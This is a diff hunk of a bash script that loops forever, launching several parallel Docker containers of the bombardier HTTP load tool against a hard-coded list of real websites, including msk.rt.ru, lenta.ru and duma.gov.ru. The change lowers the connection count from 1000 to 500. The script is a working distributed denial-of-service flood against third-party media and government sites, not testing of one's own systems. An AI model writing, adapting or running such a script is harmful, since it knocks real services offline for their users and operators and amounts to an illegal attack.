@@ -5,7 +5,7 @@ DESTS=("https://msk.rt.ru/" "http://lenta.ru" "http://duma.gov.ru/" "http://pres
 while true; do
     for DEST in ${DESTS[@]}; do
         for ((n = 0; n < 5; n++)); do
-            sudo docker run -t --rm alpine/bombardier -c 1000 -d 180s -l $DEST &
+            sudo docker run -t --rm alpine/bombardier -c 500 -d 180s -l $DEST &
             sleep 1
         done
     done
